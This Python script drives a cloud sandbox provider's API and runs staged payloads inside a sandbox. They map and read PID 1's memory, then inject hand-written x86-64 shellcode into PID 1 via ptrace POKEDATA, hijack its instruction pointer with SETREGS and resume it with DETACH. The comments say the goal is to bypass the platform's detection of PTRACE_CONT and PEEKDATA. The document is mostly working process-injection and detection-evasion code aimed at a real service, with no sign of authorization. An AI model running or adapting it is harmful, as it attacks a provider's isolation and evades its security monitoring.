# 实验J165: 注入链v2 - POKEDATA写shellcode + SETREGS劫持rip + DETACH恢复执行(绕过CONT检测)
# j164: POKEDATA写内存/SETREGS/DETACH安全, CONT/PEEKDATA触发杀
# 步骤: cmd0 maps侦察 -> cmdA PEEKTEXT读通道 -> cmdB process_vm_readv读通道
#       cmdC 完整注入(零现场恢复shellcode: push/pop + xchg [rsp],rax + ret)
#       cmdD alive检查
import json, time, urllib.request, urllib.error, sys
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=280):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    for attempt in range(4):
        c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
        if c == 200:
            break
        print(f"  retry[{attempt}] status {c}: {r[:150]}", flush=True)
        if c == 410 or "sandbox_stopped" in r:
            print(f"  SANDBOX_DEAD at cmd[{label}]", flush=True)
            return "DEAD"
        time.sleep(3)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return "DEAD" if "sandbox_stopped" in r else ""
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)
    return ""

def catfile(sid, path, label, n=6000):
    c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}",
               {"command": "cat", "args": [path], "wait": True, "logs": True, "timeout": 100})
    print(f"=== {label} status {c} ===", flush=True)
    print(r[:n], flush=True)
    return c

NAME = "expj165"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME,
            "networkPolicy": {"mode": "custom", "allowedDomains": ["httpbin.org"]}})
print("create:", c)
if c != 200:
    print(r[:400])
    sys.exit(1)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid)

# cmd0: maps 侦察
C0 = r'''
import os
out = open("/tmp/d165maps.txt", "w")
def p(*a):
    out.write(" ".join(str(x) for x in a) + "\n")
    out.flush()
try:
    maps = open("/proc/1/maps").read()
    p("MAPS_BEGIN")
    p(maps)
    p("MAPS_END")
except Exception as e:
    p("err", repr(e))
p("=== DONE")
out.close()
'''

# cmdA: attach + PEEKTEXT(1) 读 0xe9e000 8B + detach
CA = r'''
import ctypes, time, os
out = open("/tmp/d165a.txt", "w")
def p(*a):
    out.write(" ".join(str(x) for x in a) + "\n")
    out.flush()
libc = ctypes.CDLL(None, use_errno=True)
libc.ptrace.restype = ctypes.c_long
PTRACE_ATTACH, PTRACE_DETACH = 16, 17
PTRACE_PEEKTEXT = 1
def pt(pid, req, addr=0, data=0):
    ctypes.set_errno(0)
    r = libc.ptrace(req, pid, addr, data)
    return r, ctypes.get_errno()
p("start")
r, e = pt(1, PTRACE_ATTACH)
p("attach", r, "errno", e)
if r == 0:
    time.sleep(0.3)
    v, e2 = pt(1, PTRACE_PEEKTEXT, 0xe9e000)
    p("peektext", hex(v & 0xffffffffffffffff) if v != -1 or e2 == 0 else "ERR", "errno", e2)
    time.sleep(0.3)
    pt(1, PTRACE_DETACH)
    p("detached")
else:
    p("attach_failed")
p("=== DONE")
out.close()
'''

# cmdB: process_vm_readv(1) 读 0xe9e000 (不attach)
CB = r'''
import ctypes, time, os
out = open("/tmp/d165b.txt", "w")
def p(*a):
    out.write(" ".join(str(x) for x in a) + "\n")
    out.flush()
libc = ctypes.CDLL(None, use_errno=True)
libc.syscall.restype = ctypes.c_long
SYS_process_vm_readv = 310
class Iovec(ctypes.Structure):
    _fields_ = [("iov_base", ctypes.c_void_p), ("iov_len", ctypes.c_size_t)]
p("start")
buf = ctypes.create_string_buffer(16)
local = Iovec(ctypes.cast(buf, ctypes.c_void_p), 16)
remote = Iovec(ctypes.c_void_p(0xe9e000), 16)
ctypes.set_errno(0)
n = libc.syscall(SYS_process_vm_readv, 1, ctypes.byref(local), 1,
                 ctypes.byref(remote), 1, 0)
p("pvm_readv", n, "errno", ctypes.get_errno())
if n > 0:
    p("data", buf.raw.hex())
p("=== DONE")
out.close()
'''

# cmdC: 完整注入链v2 (无 CONT 无 PEEKDATA)
CC = r'''
import ctypes, time, os, struct
out = open("/tmp/d165c.txt", "w")
def p(*a):
    out.write(" ".join(str(x) for x in a) + "\n")
    out.flush()
libc = ctypes.CDLL(None, use_errno=True)
libc.ptrace.restype = ctypes.c_long
PTRACE_ATTACH, PTRACE_DETACH = 16, 17
PTRACE_GETREGS, PTRACE_SETREGS = 12, 13
PTRACE_POKEDATA = 5
class UserRegs(ctypes.Structure):
    _fields_ = [("r15", ctypes.c_ulonglong), ("r14", ctypes.c_ulonglong),
                ("r13", ctypes.c_ulonglong), ("r12", ctypes.c_ulonglong),
                ("rbp", ctypes.c_ulonglong), ("rbx", ctypes.c_ulonglong),
                ("r11", ctypes.c_ulonglong), ("r10", ctypes.c_ulonglong),
                ("r9", ctypes.c_ulonglong), ("r8", ctypes.c_ulonglong),
                ("rax", ctypes.c_ulonglong), ("rcx", ctypes.c_ulonglong),
                ("rdx", ctypes.c_ulonglong), ("rsi", ctypes.c_ulonglong),
                ("rdi", ctypes.c_ulonglong), ("orig_rax", ctypes.c_ulonglong),
                ("rip", ctypes.c_ulonglong), ("cs", ctypes.c_ulonglong),
                ("eflags", ctypes.c_ulonglong), ("rsp", ctypes.c_ulonglong),
                ("ss", ctypes.c_ulonglong), ("fs_base", ctypes.c_ulonglong),
                ("gs_base", ctypes.c_ulonglong), ("ds", ctypes.c_ulonglong),
                ("es", ctypes.c_ulonglong), ("fs", ctypes.c_ulonglong),
                ("gs", ctypes.c_ulonglong)]
def pt(pid, req, addr=0, data=0):
    ctypes.set_errno(0)
    r = libc.ptrace(req, pid, addr, data)
    return r, ctypes.get_errno()

# 1. pipe dup2 fd100
rfd, wfd = os.pipe()
os.dup2(wfd, 100)
p("pipe", rfd, wfd)

# 2. attach + getregs
r, e = pt(1, PTRACE_ATTACH)
p("attach", r, "errno", e)
if r != 0:
    p("attach_failed")
    out.close()
    raise SystemExit
time.sleep(0.3)
regs = UserRegs()
pt(1, PTRACE_GETREGS, 0, ctypes.byref(regs))
orig_rip = regs.rip
p("orig_rip", hex(orig_rip))

# 3. 选 SC_ADDR: 从 maps 找可执行段
maps = open("/proc/1/maps").read()
sc_addr = None
rx_seg = None
for line in maps.splitlines():
    parts = line.split()
    if len(parts) < 2:
        continue
    perm = parts[1]
    if "x" not in perm:
        continue
    start, end = int(parts[0].split("-")[0], 16), int(parts[0].split("-")[1], 16)
    if "w" in perm:
        sc_addr = (end - 0x2000) & ~0xfff
        p("sc_rwx_seg", hex(start), hex(end))
        break
    if rx_seg is None or end > rx_seg[1]:
        rx_seg = (start, end)
if sc_addr is None and rx_seg:
    start, end = rx_seg
    sc_addr = (end - 0x1000) & ~0xfff
    p("sc_rx_seg", hex(start), hex(end))
p("sc_addr", hex(sc_addr))

MSG_ADDR = sc_addr + 0x400
sc = b""
sc += b"\x50"                                # push rax
sc += b"\x57"                                # push rdi
sc += b"\x56"                                # push rsi
sc += b"\x52"                                # push rdx
sc += b"\x48\xc7\xc0\x01\x00\x00\x00"        # mov rax, 1
sc += b"\x48\xc7\xc7\x64\x00\x00\x00"        # mov rdi, 100
sc += b"\x48\xc7\xc6" + struct.pack("<I", MSG_ADDR & 0xffffffff)  # mov rsi, MSG
sc += b"\xba\x0c\x00\x00\x00"                # mov rdx, 12
sc += b"\x0f\x05"                            # syscall
sc += b"\x5a"                                # pop rdx
sc += b"\x5e"                                # pop rsi
sc += b"\x5f"                                # pop rdi
sc += b"\x58"                                # pop rax (恢复)
sc += b"\x50"                                # push rax (原值压栈)
sc += b"\x48\xb8" + struct.pack("<Q", orig_rip)  # mov rax, orig_rip
sc += b"\x48\x87\x04\x24"                    # xchg [rsp], rax -> [rsp]=orig_rip, rax=原rax
sc += b"\xc3"                                # ret -> rip=orig_rip, rsp恢复, 零痕迹
pad = MSG_ADDR - (sc_addr + len(sc))
if pad > 0:
    sc += b"\x90" * pad
sc += b"HIJACK_OK!!\x00"
p("sc_len", len(sc))

# 4. POKEDATA 写入 (遇 EIO 往前退页重试)
written = False
cur = sc_addr
for attempt in range(3):
    ok = True
    for i in range(0, len(sc), 8):
        chunk = sc[i:i+8]
        chunk += b"\x00" * (8 - len(chunk))
        val = struct.unpack("<Q", chunk)[0]
        r2, e2 = pt(1, PTRACE_POKEDATA, cur + i, val)
        if r2 != 0:
            p("poke_err", hex(cur+i), "errno", e2)
            ok = False
            break
    if ok:
        written = True
        break
    cur -= 0x1000
    p("retry_addr", hex(cur))
p("sc_written", written, "at", hex(cur) if written else "NONE")
if not written:
    pt(1, PTRACE_DETACH)
    p("aborted_detached")
    out.close()
    raise SystemExit

# 5. SETREGS rip -> shellcode
regs.rip = cur
r3, e3 = pt(1, PTRACE_SETREGS, 0, ctypes.byref(regs))
p("setregs", r3, "errno", e3)

# 6. DETACH (恢复执行, 代替 CONT)
pt(1, PTRACE_DETACH)
p("detached")

# 7. 读 pipe
time.sleep(2.5)
os.set_blocking(rfd, False)
data = b""
try:
    while True:
        d = os.read(rfd, 4096)
        if not d:
            break
        data += d
except BlockingIOError:
    pass
p("pipe_data", repr(data))
p("=== DONE")
out.close()
'''

# cmdD: alive 检查
CD = r'''
import os
out = open("/tmp/d165d.txt", "w")
def p(*a):
    out.write(" ".join(str(x) for x in a) + "\n")
    out.flush()
try:
    p("pid1_exists", os.path.exists("/proc/1"))
    p("cmdline", open("/proc/1/cmdline", "rb").read()[:80])
except Exception as e:
    p("err", repr(e))
p("=== DONE")
out.close()
'''

steps = [
    ("maps", "/tmp/d165maps.txt", C0),
    ("peektext", "/tmp/d165a.txt", CA),
    ("pvm-readv", "/tmp/d165b.txt", CB),
    ("inject-v2", "/tmp/d165c.txt", CC),
    ("alive", "/tmp/d165d.txt", CD),
]

for label, marker, code in steps:
    st = run_cmd(sid, code, label, timeout=220)
    time.sleep(2)
    cf = catfile(sid, marker, f"marker[{label}]", 8000)
    if st == "DEAD" or cf == 410:
        print(f"\n!!! DEATH after cmd[{label}] -> trigger = {label}", flush=True)
        break

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
